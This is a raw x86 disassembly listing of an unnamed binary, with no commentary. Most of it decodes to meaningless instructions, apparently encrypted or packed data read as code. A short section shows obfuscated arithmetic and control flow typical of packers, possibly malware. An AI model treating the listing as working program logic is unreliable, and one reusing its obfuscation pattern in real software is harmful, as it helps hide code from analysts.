  4059a6:	out    0x41,eax
  4059a8:	mov    cl,0x22
  4059aa:	loop   0x40596b
  4059ac:	call   0x45ce:0x6fc6ab17
  4059b3:	(bad)  
  4059b4:	fadd   st(4),st
  4059b6:	ins    BYTE PTR es:[edi],dx
  4059b7:	inc    ebp
  4059b8:	lods   eax,DWORD PTR ds:[esi]
  4059b9:	inc    eax
  4059ba:	mov    dh,0xfb
  4059bc:	mov    edi,0x7986a6fc
  4059c1:	scas   al,BYTE PTR es:[edi]
  4059c2:	fdiv   QWORD PTR [esi-0x3e]
  4059c5:	test   eax,0x9f513af1
  4059ca:	inc    edi
  4059cb:	add    bl,cl
  4059cd:	hlt    
  4059ce:	in     al,dx
  4059cf:	inc    edx
  4059d0:	jp     0x405a4b
  4059d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d3:	out    0x73,al
  4059d5:	and    al,0x1
  4059d7:	lods   eax,DWORD PTR ds:[esi]
  4059d8:	inc    esp
  4059d9:	stos   BYTE PTR es:[edi],al
  4059da:	lods   eax,DWORD PTR ds:[esi]
  4059db:	pop    ebx
  4059dc:	mov    bl,cl
  4059de:	inc    DWORD PTR [ebp-0x57]
  4059e1:	cmp    al,cl
  4059e3:	adc    bh,BYTE PTR [ecx+0x73]
  4059e6:	push   esp
  4059e7:	(bad)  
  4059e8:	mov    ebp,0x8ec14e06
  4059ed:	out    0xb8,eax
  4059ef:	pusha  
  4059f0:	dec    ebx
  4059f1:	mov    ebx,0x9804abd0
  4059f6:	dec    ebx
  4059f7:	sahf   
  4059f8:	cmp    BYTE PTR [edx+0x607378cc],0x61
  4059ff:	sub    ecx,DWORD PTR [ebx]
  405a01:	repnz push eax
  405a03:	and    DWORD PTR [edi+eiz*1+0xf],ecx
  405a07:	sub    BYTE PTR [ebx+0x14],al
  405a0a:	test   ecx,ebx
  405a0c:	pusha  
  405a0d:	pop    ebp
  405a0e:	or     DWORD PTR [si-0x1ec5],esp
  405a13:	mov    BYTE PTR [edi+0x71d67cdf],cl
  405a19:	mov    esp,0xd1900822
  405a1e:	sbb    eax,0x5bb5c043
  405a23:	jp     0x405a01
  405a25:	retf   0xb582
  405a28:	repnz sbb al,ah
  405a2b:	stc    
  405a2c:	mov    ebp,0xa0736fad
  405a31:	popf   
  405a32:	dec    eax
  405a33:	adc    BYTE PTR [edx+0x1840f798],ch
  405a39:	or     al,0x8
  405a3b:	pop    edi
  405a3c:	es pop edi
  405a3e:	mov    eax,ds:0x35a0e529
  405a43:	cld    
  405a44:	jb     0x689f7115
  405a4a:	xchg   edx,eax
  405a4b:	sub    cl,al
  405a4d:	sub    eax,0xded7c697
  405a52:	fild   WORD PTR [esi+eiz*1+0x5]
  405a56:	mov    ebx,DWORD PTR [edi+0x15]
  405a59:	xor    ebp,DWORD PTR [ecx]
  405a5b:	into   
  405a5c:	leave  
  405a5d:	inc    ecx
  405a5e:	imul   DWORD PTR [edi-0x23a9d734]
  405a64:	aas    
  405a65:	and    al,BYTE PTR [ebp-0x6aec06b8]
  405a6b:	mov    esi,DWORD PTR [eax]
  405a6d:	ss (bad) 
  405a70:	fisttp WORD PTR [ebx]
  405a72:	cwde   
  405a73:	call   0xbf60:0x63d17738
  405a7a:	xlat   BYTE PTR ds:[ebx]
  405a7b:	ror    DWORD PTR [ecx-0x29757f04],cl
  405a81:	sub    al,0xd3
  405a83:	mov    cl,0x3c
  405a85:	dec    esp
  405a86:	pop    ss
  405a87:	xchg   ebp,eax
  405a88:	push   es
  405a89:	jmp    0x405a99
  405a8b:	mov    ds:0x701fde4d,al
  405a90:	push   ebp
  405a91:	shl    DWORD PTR [eax],cl
  405a93:	pop    ss
  405a94:	pop    ebp
  405a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a96:	adc    DWORD PTR [ebp+0x17],ecx
  405a99:	push   ebp
  405a9a:	inc    eax
  405a9b:	daa    
  405a9c:	sub    eax,DWORD PTR [esi]
  405a9e:	retf   
  405a9f:	jmp    0x7d2d:0x24adc25b
  405aa6:	inc    ecx
  405aa7:	mov    ebx,0x6d71fb1c
  405aac:	add    cl,BYTE PTR [ecx-0x38]
  405aaf:	jno    0x405b22
  405ab1:	out    dx,eax
  405ab2:	rcr    DWORD PTR [esi+ebx*2+0x3e],0x1d
  405ab7:	ds sti 
  405ab9:	xchg   BYTE PTR [ebx],bl
  405abb:	and    eax,0x94bf97ad
  405ac0:	xor    al,0xc0
  405ac2:	xor    esi,ebp
  405ac4:	jns    0x405aaf
  405ac6:	jge    0x405aad
  405ac8:	mov    bl,0xa9
  405aca:	lock out 0x54,eax
  405acd:	jg     0x405ad5
  405acf:	aaa    
  405ad0:	and    edi,DWORD PTR [edi+0x6f]
  405ad3:	test   al,0xa4
  405ad5:	mov    ebx,0x1f09b9f8
  405ada:	dec    edx
  405adb:	add    al,0xdb
  405add:	and    al,BYTE PTR [edx]
  405adf:	pop    eax
  405ae0:	push   edx
  405ae1:	scas   eax,DWORD PTR es:[edi]
  405ae2:	xor    bh,BYTE PTR [edi-0x53]
  405ae5:	addr16 dec esi
  405ae7:	imul   edi,DWORD PTR [esi+eiz*8-0x71],0xffffffc3
  405aec:	pop    ss
  405aed:	or     bh,0xa7
  405af0:	cwde   
  405af1:	add    al,0xa9
  405af3:	xor    eax,0x9e918855
  405af8:	iret   
  405af9:	repnz lods eax,DWORD PTR ds:[esi]
  405afb:	cmp    DWORD PTR [esi],ebx
  405afd:	fwait
  405afe:	xchg   ch,bl
  405b00:	and    DWORD PTR [esi+0x10a4772a],ebp
  405b06:	mov    bh,0x2b
  405b08:	jo     0x405abf
  405b0a:	add    eax,0xedd753e2
  405b0f:	pop    ebx
  405b10:	xor    DWORD PTR [edx+0x58fe4f82],0x7e
  405b17:	(bad)  
  405b18:	(bad)  [edi-0x1105e0cf]
  405b1e:	fild   WORD PTR [ecx-0x10d06927]
  405b24:	(bad)  
  405b26:	andnps xmm4,XMMWORD PTR [eax]
  405b29:	icebp  
  405b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2b:	jbe    0x405b19
  405b2d:	mov    ebx,0x789320f1
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xaaea9b13
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c59
  405be0:	add    eax,0xc73c8b2c
  405be5:	das    
  405be6:	cmc    
  405be7:	js     0x405c04
  405be9:	popa   
  405bea:	cmp    dl,dh
  405bec:	xchg   BYTE PTR ds:0x35c2ef00,bh
  405bf2:	dec    esp
  405bf3:	lock dec ebx
  405bf5:	daa    
  405bf6:	enter  0xf62e,0x6a
  405bfa:	xor    BYTE PTR [edi-0x7c],0xaf
  405bfe:	test   eax,0x4993d4aa
  405c03:	mov    ss,ebp
  405c05:	mov    edi,0x2e0d3e9e
  405c0a:	inc    esp
  405c0b:	mov    esi,0xb5d98ad0
  405c10:	inc    ecx
  405c11:	and    dh,al
  405c13:	icebp  
  405c14:	clc    
  405c15:	leave  
  405c16:	jl     0x405c0a
  405c18:	cmp    eax,0x61938501
  405c1d:	out    dx,eax
  405c1e:	inc    ebp
  405c1f:	push   ss
  405c20:	pop    ebp
  405c21:	xor    BYTE PTR [edx+0x3c],ch
  405c24:	vxorpd xmm2,xmm4,XMMWORD PTR [eax+0x1d]
  405c29:	mov    ah,0xc9
  405c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c2c:	ja     0x405bde
  405c2e:	out    0xf5,eax
  405c30:	adc    ah,cl
  405c32:	test   DWORD PTR [esp+edi*4-0x73795b64],eax
  405c39:	mov    WORD PTR [eax-0x70],fs
  405c3c:	ds icebp 
  405c3e:	gs xchg esi,eax
  405c40:	xor    edx,esp
  405c42:	out    dx,eax
  405c43:	cmp    cl,BYTE PTR [eax+0x7a6fb66c]
  405c49:	sbb    edi,DWORD PTR ds:0x75ce7076
  405c4f:	es and eax,0x7e511ad9
  405c55:	xchg   DWORD PTR [eax],esi
  405c57:	mov    cl,0xf
  405c59:	xor    eax,0xf198b3d5
  405c5e:	sar    DWORD PTR [ecx],cl
  405c60:	inc    ecx
  405c61:	sbb    DWORD PTR [ebx-0xf7b992e],esp
  405c67:	pop    ecx
  405c68:	sar    DWORD PTR [ecx+esi*1+0x58],0x5
  405c6d:	nop
  405c6e:	pop    esp
  405c6f:	sbb    DWORD PTR [edi-0x3e14dfcd],eax
  405c75:	xchg   ebp,eax
  405c76:	in     al,dx
  405c77:	data16 mov bl,0xc1
  405c7a:	ror    DWORD PTR ds:0x8677498b,cl
  405c80:	cmp    DWORD PTR ds:0x5d35ead9,esp
  405c86:	loop   0x405cdf
  405c88:	xchg   ecx,eax
  405c89:	mov    edi,0x443e6717
  405c8e:	fistp  QWORD PTR [ecx]
  405c90:	push   esp
  405c91:	or     al,0x80
  405c93:	cmp    bl,BYTE PTR [esi]
  405c95:	xor    edx,ebp
  405c97:	sbb    eax,0xa8dedd76
  405c9c:	inc    esp
  405c9d:	jae    0x405c9e
  405c9f:	mov    bl,0xad
  405ca1:	mov    dl,0x40
  405ca3:	push   cs
  405ca4:	(bad)  
  405ca5:	data16 sbb BYTE PTR [edi+ebp*2+0xb81a273],0xef
  405cae:	xlat   BYTE PTR ds:[ebx]
  405caf:	mov    edi,0xa0bf279
  405cb4:	mov    eax,0x695aa84d
  405cb9:	stos   DWORD PTR es:[edi],eax
  405cba:	sar    dl,0xe1
  405cbd:	cmp    esp,DWORD PTR [edx-0x41]
  405cc0:	cmp    ah,BYTE PTR [esi-0x6e2290de]
  405cc6:	jnp    0x405c84
  405cc8:	pop    es
  405cc9:	fdiv   st(2),st
  405ccb:	dec    esi
  405ccc:	jecxz  0x405cda
  405cce:	(bad)  
  405ccf:	mov    eax,0x898d2118
  405cd4:	add    bh,BYTE PTR [ecx-0xe]
  405cd7:	jecxz  0x405d37
  405cd9:	sub    DWORD PTR ds:0xc51252d1,ebp
  405cdf:	pop    esp
  405ce0:	jbe    0x405d1b
  405ce2:	cmc    
  405ce3:	sub    al,0x8d
  405ce5:	jno    0x405c9f
  405ce7:	xor    al,0xa6
  405ce9:	les    edi,FWORD PTR [edi+0x3f]
  405cec:	sar    al,0xae
  405cef:	sar    BYTE PTR [eax-0x66e14386],cl
  405cf5:	jmp    0x1305:0x1043bfd5
  405cfc:	mov    ebx,0xaa7f5228
  405d01:	cwde   
  405d02:	xchg   esp,eax
  405d03:	add    cl,BYTE PTR [edi]
  405d05:	sbb    al,0x52
  405d07:	fidiv  DWORD PTR [edi+0x2acbc0b7]
  405d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0e:	call   0xedf2:0x86109f73
  405d15:	iret   
  405d16:	or     al,0x16
  405d18:	aam    0xf
  405d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d1b:	pop    ds
  405d1c:	cmp    DWORD PTR ds:0xb12e5713,edi
  405d22:	scas   al,BYTE PTR es:[edi]
  405d23:	sub    eax,0xcda9d7ba
  405d28:	mov    al,0x4e
  405d2a:	mov    bl,0x67
  405d2c:	sbb    BYTE PTR [ebx+0x5bd8ce21],0xf6
  405d33:	repz push ss
  405d35:	jno    0x405d8a
  405d37:	xchg   dl,bl
  405d39:	in     al,0x8a
  405d3b:	data16 jns 0x405d6b
  405d3e:	mov    cl,0xbe
  405d40:	sub    eax,0x14e1f4a9
  405d45:	into   
  405d46:	mov    cl,0x4f
  405d48:	daa    
  405d49:	fdiv   DWORD PTR [esi]
  405d4b:	inc    edx
  405d4c:	jge    0x405d18
  405d4e:	jle    0x405d14
  405d50:	mov    eax,0xf5e2350a
  405d55:	daa    
  405d56:	mov    edx,0x5c43c4e0
  405d5b:	std    
  405d5c:	clc    
  405d5d:	adc    BYTE PTR [edx+edx*8],ch
  405d60:	fild   QWORD PTR [esi]
  405d62:	adc    DWORD PTR [eax],0xffffffc1
  405d65:	push   edx
  405d66:	iret   
  405d67:	repz lock data16 stc 
  405d6b:	icebp  
  405d6c:	test   al,0x54
  405d6e:	cmp    ebp,DWORD PTR [edi]
  405d70:	inc    ebx
  405d71:	shr    edi,0xa6
  405d74:	(bad)  
  405d75:	repz add ecx,esp
  405d78:	sahf   
  405d79:	cwde   
  405d7a:	out    dx,eax
  405d7b:	xlat   BYTE PTR ds:[ebx]
  405d7c:	inc    eax
  405d7d:	sahf   
  405d7e:	mov    al,0x12
  405d80:	xor    BYTE PTR [ecx],cl
  405d82:	and    ebp,DWORD PTR [edi]
  405d84:	data16 fwait
  405d86:	gs inc ecx
  405d88:	sub    edi,edi
  405d8a:	inc    edx
  405d8b:	pop    ss
  405d8c:	mov    esi,DWORD PTR [ebp-0x1150b0d1]
  405d92:	add    ecx,ebx
  405d94:	mov    esi,0x5d4b71cb
  405d99:	mov    esp,0x96b63aa3
  405d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d9f:	inc    ebp
  405da0:	lods   eax,DWORD PTR ds:[esi]
  405da1:	and    ebx,ebp
  405da3:	jecxz  0x405dd7
  405da5:	mov    WORD PTR [ecx],?
  405da7:	mov    ebx,0x8b738282
  405dac:	jo     0x405d74
  405dae:	dec    di
  405db0:	mov    cl,0x81
  405db2:	pop    eax
  405db3:	sbb    DWORD PTR [edx],esi
  405db5:	push   eax
  405db6:	xchg   ebx,eax
  405db7:	mul    DWORD PTR [esp+edi*1]
  405dba:	std    
  405dbb:	jns    0x405e11
  405dbd:	and    BYTE PTR [edx-0x69],al
  405dc0:	mov    esi,0xeb996bed
  405dc5:	jnp    0x405d95
  405dc7:	mov    dl,0xd0
  405dc9:	jne    0x405da2
  405dcb:	in     al,dx
  405dcc:	ins    DWORD PTR es:[edi],dx
  405dcd:	dec    ebx
  405dce:	sub    dl,BYTE PTR [esi-0x4731ab88]
  405dd4:	sahf   
  405dd5:	dec    ebp
  405dd6:	addr16 in eax,dx
  405dd8:	shl    BYTE PTR ds:0x2257893d,cl
  405dde:	ss pop ds
  405de0:	cdq    
  405de1:	pop    es
  405de2:	sar    dh,0x61
  405de5:	adc    al,0x6f
  405de7:	leave  
  405de8:	outs   dx,DWORD PTR ss:[esi]
  405dea:	or     al,0x8c
  405dec:	adc    BYTE PTR [esi],bl
  405dee:	push   ds
  405def:	test   al,0x3e
  405df1:	jle    0x405df2
  405df3:	inc    esi
  405df4:	mov    edi,0xe1822154
  405df9:	ins    BYTE PTR es:[edi],dx
  405dfa:	mov    bh,0x79
  405dfc:	imul   esi,DWORD PTR [edx*1+0x6596ea13],0x13
  405e04:	sub    cl,bh
  405e06:	xchg   esp,eax
  405e07:	arpl   WORD PTR [edx+0x735fe91],sp
  405e0d:	les    edi,FWORD PTR [ecx]
  405e0f:	call   0xbe359d62
  405e14:	ss mov edx,0x5c4780c8
  405e1a:	and    al,BYTE PTR [ecx+edi*8-0x1a6c6c21]
  405e21:	jmp    0x1747f979
  405e26:	shr    BYTE PTR [edi+0x6d],cl
  405e29:	push   ebp
  405e2a:	pop    ebp
  405e2b:	test   edx,edi
  405e2d:	mov    bh,0xfa
  405e2f:	mov    ?,WORD PTR [esi+eiz*2]
  405e32:	(bad)  
  405e33:	xor    al,0x41
  405e35:	jbe    0x405e9c
  405e37:	dec    ecx
  405e38:	push   edx
  405e39:	fs adc al,0x9b
  405e3c:	xchg   esi,eax
  405e3d:	pop    es
  405e3e:	(bad)  
  405e40:	sub    al,0x3c
  405e42:	pusha  
  405e43:	mov    al,ds:0xcb4aff35
  405e48:	pushf  
  405e49:	mov    ds:0xfc742e6e,al
  405e4e:	jbe    0x405e8f
  405e50:	into   
  405e51:	mov    ah,0x9d
  405e53:	mov    DWORD PTR [eax+0x6a],esp
  405e56:	push   esp
  405e57:	jae    0x405e1f
  405e59:	loope  0x405e96
  405e5b:	push   ecx
  405e5c:	adc    esi,ebp
  405e5e:	into   
  405e5f:	sbb    al,0x79
  405e61:	stc    
  405e62:	ss retf 0xe20c
  405e66:	or     edi,DWORD PTR [ebp+0x1438c56]
  405e6c:	sbb    DWORD PTR [ebx+0x21],ecx
  405e6f:	mov    cl,0x2f
  405e71:	retf   0x4326
  405e74:	sub    DWORD PTR [edx+0x548873a5],ecx
  405e7a:	stos   BYTE PTR es:[edi],al
  405e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e7c:	pop    ds
  405e7d:	mov    ecx,0xad3e313c
  405e82:	ss cmp esp,esp
  405e85:	mov    eax,0x27b2569c
  405e8a:	pop    esp
  405e8b:	xor    al,0xf8
  405e8d:	inc    edx
  405e8e:	rcl    BYTE PTR [eax+0x30],0x6b
  405e92:	into   
  405e93:	stc    
  405e94:	ins    DWORD PTR es:[edi],dx
  405e95:	mov    ds:0x7b6e4b0f,al
  405e9a:	scas   eax,DWORD PTR es:[edi]
  405e9b:	xchg   dl,dh
  405e9d:	retf   0x1c82
  405ea0:	popf   
  405ea1:	mov    dh,0x81
  405ea3:	or     BYTE PTR [esi+edx*8+0x2d8c1796],0xd6
  405eab:	shl    DWORD PTR [edx],1
  405ead:	jnp    0x405e9a
  405eaf:	inc    ecx
  405eb0:	mov    edx,ebp
  405eb2:	adc    BYTE PTR [esp-0x6e619925],al
  405eb9:	mov    al,BYTE PTR [ebp-0x1035e577]
  405ebf:	jle    0x405e85
  405ec1:	in     eax,0x4c
  405ec3:	imul   esi,DWORD PTR [ebx],0xbe694483
  405ec9:	(bad)  
  405eca:	push   esp
  405ecb:	jge    0x405f1e
  405ecd:	sbb    bl,BYTE PTR [esi]
  405ecf:	in     eax,0xaf
  405ed1:	out    dx,eax
  405ed2:	addr16 out 0xd2,eax
  405ed5:	fdiv   QWORD PTR [esi-0x3e923796]
  405edb:	ja     0x405e5f
  405edd:	sub    BYTE PTR [eax],cl
  405edf:	leave  
  405ee0:	(bad)  
  405ee1:	or     DWORD PTR [ebx+0x5516e6b4],0x35814dc1
  405eeb:	adc    eax,0x750dae20
  405ef0:	fwait
  405ef1:	mov    esi,0x179de70c
  405ef6:	push   0xd0d40175
  405efb:	push   edi
  405efc:	and    eax,0xbf4c4fb9
  405f01:	mov    bh,0x44
  405f03:	cmp    al,0x80
  405f05:	lea    ecx,[edi+0x2cbdb458]
  405f0b:	dec    ebp
  405f0c:	lds    ebx,FWORD PTR [esi]
  405f0e:	dec    esi
  405f0f:	push   0xf7f1333c
  405f14:	fldl2t 
  405f16:	dec    edx
  405f17:	add    eax,DWORD PTR [eax]
  405f19:	add    BYTE PTR [ebp-0x2e],dh
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx],cs
  405f27:	call   0x30e69058
  405f2c:	jle    0x405fac
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	xor    al,0x3
  405f34:	adc    DWORD PTR [ebp-0x5e],esp
  405f37:	mov    esi,0x58b943bf
  405f3c:	jg     0x405ee1
  405f3e:	and    eax,0x59ec642e
  405f43:	mov    cl,0xed
  405f45:	mov    esp,0xf547c9d8
  405f4a:	repnz in eax,0xb5
  405f4d:	jl     0x405fb9
  405f4f:	sbb    edi,DWORD PTR [ecx+ebx*8]
  405f52:	(bad)  
  405f53:	adc    BYTE PTR [eax+eiz*2-0x12fb61db],cl
  405f5a:	test   DWORD PTR [ecx],ebp
  405f5c:	out    0xef,al
  405f5e:	sub    al,0x24
  405f60:	pushf  
  405f61:	mov    bh,0xe7
  405f63:	in     eax,dx
  405f64:	mov    esp,0x645aa758
  405f69:	pop    ebp
  405f6a:	push   eax
  405f6b:	ins    BYTE PTR es:[edi],dx
  405f6c:	ret    0xfb27
  405f6f:	daa    
  405f70:	inc    eax
  405f71:	sbb    esp,DWORD PTR [ecx+ebx*1-0x18]
  405f75:	pop    esp
  405f76:	sar    BYTE PTR [edi+0x2ab547c2],0x49
  405f7d:	add    BYTE PTR [ecx-0x4d],cl
  405f80:	add    DWORD PTR [edi-0x15],edi
  405f83:	dec    edx
  405f84:	imul   edx,DWORD PTR [edi+edx*4+0x57],0x4768cfc
  405f8c:	pusha  
  405f8d:	inc    eax
  405f8e:	mov    al,BYTE PTR [ecx+0x3f]
  405f91:	cmp    cl,bh
  405f93:	cwde   
  405f94:	and    BYTE PTR [ecx+edi*1+0x7e1c7a9a],bl
  405f9b:	cmp    DWORD PTR [edx+0x30],ebp
  405f9e:	loopne 0x405fcd
  405fa0:	mov    cl,0x2f
  405fa2:	lahf   
  405fa3:	pop    esi
  405fa4:	aas    
  405fa5:	sbb    BYTE PTR [esi-0x61a0df23],0x62
  405fac:	and    DWORD PTR [edi-0xf],0x72
  405fb0:	jg     0x40602c
  405fb2:	data16 sahf 
  405fb4:	dec    esp
  405fb5:	pop    esp
  405fb6:	sbb    bh,dh
  405fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb9:	push   cs
  405fba:	lods   al,BYTE PTR ds:[esi]
  405fbb:	xor    eax,0xd83e35b1
  405fc0:	inc    ecx
  405fc1:	push   cs
  405fc2:	xlat   BYTE PTR ds:[ebx]
  405fc3:	out    0xe3,al
  405fc5:	call   0x2cb0:0xff27521d
  405fcc:	mov    ebx,ecx
  405fce:	xchg   DWORD PTR [edx-0x31],edi
  405fd1:	xor    al,0x66
  405fd3:	sar    BYTE PTR [esi],0xec
  405fd6:	push   esp
  405fd7:	lahf   
  405fd8:	mov    al,ds:0x7ede89b4
  405fdd:	imul   edx,DWORD PTR [ebx-0x3d],0x95e7a890
  405fe4:	xchg   BYTE PTR [ecx+0x27e1f269],ah
  405fea:	add    al,0xa2
  405fec:	das    
  405fed:	out    0xd7,al
  405fef:	idiv   BYTE PTR [edx]
  405ff1:	xor    ch,dl
  405ff3:	fwait
  405ff4:	xchg   edx,eax
  405ff5:	push   ebx
  405ff6:	inc    esi
  405ff7:	arpl   WORD PTR [edx],bx
  405ff9:	xchg   ebp,eax
  405ffa:	aas    
  405ffb:	int3   
  405ffc:	jecxz  0x405f88
  405ffe:	fwait
  405fff:	xlat   BYTE PTR ds:[ebx]
  406000:	arpl   WORD PTR [esi],ax
  406002:	sbb    bl,BYTE PTR [eax]
  406004:	or     al,0xf3
  406006:	fistp  WORD PTR [eax-0x6e]
  406009:	ja     0x406061
  40600b:	jae    0x405fdc
  40600d:	mov    edx,0xbb25be68
  406012:	push   es
  406013:	xor    DWORD PTR [edx+0x15],ebp
  406016:	dec    edx
  406017:	jp     0x405fc1
  406019:	xchg   esp,eax
  40601a:	loope  0x405fec
  40601c:	dec    esi
  40601d:	sub    eax,0xf4883a7e
  406022:	push   ebx
  406023:	ret    
  406024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406025:	and    edi,DWORD PTR [esi]
  406027:	mov    bh,0x92
  406029:	imul   eax,DWORD PTR [edx-0xdb3932b],0x486a2dfd
  406033:	jp     0x405fb7
  406035:	pop    esp
  406036:	xor    bl,bl
  406038:	add    BYTE PTR [ecx],0x27
  40603b:	pop    eax
  40603c:	aas    
  40603d:	jo     0x40600e
  40603f:	mov    bh,0xa6
  406041:	xchg   ecx,eax
  406042:	sbb    al,0xa2
  406044:	fs and al,0xb4
  406047:	int    0x53
  406049:	mov    al,ds:0xd6d6aa7
  40604e:	push   0x1d4564ff
  406053:	shl    DWORD PTR [edx-0x62533e93],1
  406059:	push   0x5b2b49e6
  40605e:	lldt   WORD PTR ds:0x4aee03e8
  406065:	dec    eax
  406066:	outs   dx,DWORD PTR ds:[esi]
  406067:	icebp  
  406068:	mov    ebx,0x1fbf6c6b
  40606d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40606e:	std    
  40606f:	fwait
  406070:	jno    0x406012
  406072:	imul   ebx,DWORD PTR [ebp-0x2313fff9],0x6a
  406079:	cmp    ebx,DWORD PTR [esi+ebp*1+0x66]
  40607d:	mov    dl,BYTE PTR [ebx-0x4a]
  406080:	inc    edx
  406081:	dec    edi
  406082:	mov    esi,0xe415e917
  406087:	ins    DWORD PTR es:[edi],dx
  406088:	out    dx,eax
  406089:	test   eax,0xe2c8ffd0
  40608e:	daa    
  40608f:	loop   0x406052
  406091:	dec    ecx
  406092:	psubsb mm5,QWORD PTR [eax+0x54]
  406096:	push   ss
  406097:	dec    ecx
  406098:	mov    ecx,0xdac7635
  40609d:	pop    edi
  40609e:	shr    BYTE PTR [ebx-0x1e],0xd6
  4060a2:	mov    eax,0x8f6fcc95
  4060a7:	xchg   edi,eax
  4060a8:	mov    edx,0xc0dd943f
  4060ad:	sbb    ecx,DWORD PTR [edx]
  4060af:	cmp    eax,0xd2c243cd
  4060b4:	xor    bl,bl
  4060b6:	jp     0x40605b
  4060b8:	pop    eax
  4060b9:	push   cs
  4060ba:	push   edx
  4060bb:	in     eax,dx
  4060bc:	in     eax,dx
  4060bd:	inc    eax
  4060be:	hlt    
  4060bf:	push   ecx
  4060c0:	out    0x1c,eax
  4060c2:	imul   eax,DWORD PTR [ebx-0x4da24073],0x73
  4060c9:	inc    edx
  4060ca:	frstor [esi+0x37df1ab3]
  4060d0:	enter  0xdc0c,0xb0
  4060d4:	sbb    al,0x36
  4060d6:	mov    ebp,0xe8f76bc0
  4060db:	ins    DWORD PTR es:[edi],dx
  4060dc:	inc    esi
  4060dd:	adc    al,0x9c
  4060df:	mov    ecx,0x568d01db
  4060e4:	aad    0x18
  4060e6:	scas   eax,DWORD PTR es:[edi]
  4060e7:	jp     0x406100
  4060e9:	loopne 0x40607d
  4060eb:	dec    esi
  4060ec:	mov    esi,DWORD PTR [edi-0x19]
  4060ef:	(bad)
  4060f2:	icebp  
  4060f3:	fucomip st,st(7)
  4060f5:	lods   eax,DWORD PTR ds:[esi]
  4060f6:	in     eax,dx
  4060f7:	les    esi,FWORD PTR ds:[edx+eiz*8-0x29ce3c1b]
  4060ff:	cmp    eax,0x8c758db0
  406104:	jle    0x406141
  406106:	pop    edi
  406107:	xchg   ebx,eax
  406108:	mov    edx,0xa343c9f2
  40610e:	lods   eax,DWORD PTR ds:[esi]
  40610f:	or     eax,0xf1589c51
  406114:	or     BYTE PTR [ecx-0x3573ea30],ch
  40611a:	mov    ?,WORD PTR [ebp+eiz*2-0x59053e0e]
  406121:	int    0x81
  406123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406124:	mov    bl,BYTE PTR [ebx-0x5cf55e8d]
  40612a:	xchg   BYTE PTR [edi+0x17bfd035],dh
  406130:	cmp    al,0x1c
  406132:	jp     0x40615c
  406134:	popa   
  406135:	stc    
  406136:	add    al,0xf8
  406138:	or     eax,0x894e41c6
  40613d:	push   ecx
  40613e:	dec    ebp
  40613f:	mov    edx,0xb561ae31
  406144:	mov    esp,0xf9270180
  406149:	jecxz  0x406103
  40614b:	frstor [ebp-0x67ed2fa]
  406151:	dec    esp
  406152:	sar    DWORD PTR [eax],cl
  406154:	loope  0x40616b
  406156:	shl    BYTE PTR [esi],0x43
  406159:	repz mov eax,0x8076f916
  40615f:	dec    ebp
  406160:	pop    ebp
  406161:	add    eax,0xfd45b482
  406166:	adc    DWORD PTR [ebp-0x34b2dae8],edi
  40616c:	jno    0x4061dc
  40616e:	into   
  40616f:	sub    eax,DWORD PTR [eax+0x663f5f3b]
  406175:	pop    ds
  406176:	sbb    dl,BYTE PTR [ebx+ebp*4]
  406179:	adc    al,0x9b
  40617b:	xor    eax,0x3010a2a2
  406180:	dec    edi
  406181:	pop    es
  406182:	mov    ebx,0x37d39803
  406187:	iret   
  406188:	popa   
  406189:	or     ebp,DWORD PTR [esi-0x21]
  40618c:	dec    esi
  40618d:	fstp   TBYTE PTR [ecx-0x4f2d4614]
  406193:	ret    0x5596
  406196:	jp     0x4061ef
  406198:	sahf   
  406199:	adc    ecx,DWORD PTR [ebx]
  40619b:	aam    0xcc
  40619d:	out    0xcc,eax
  40619f:	mov    dh,0x4c
  4061a1:	xor    DWORD PTR [eax-0x48],ebp
  4061a4:	sub    eax,0x89be507f
  4061a9:	add    eax,0x20d935c4
  4061ae:	pop    esp
  4061af:	out    dx,eax
  4061b0:	test   BYTE PTR [ecx+ecx*1+0x40],cl
  4061b4:	fdivrp st(3),st
  4061b6:	hlt    
  4061b7:	pusha  
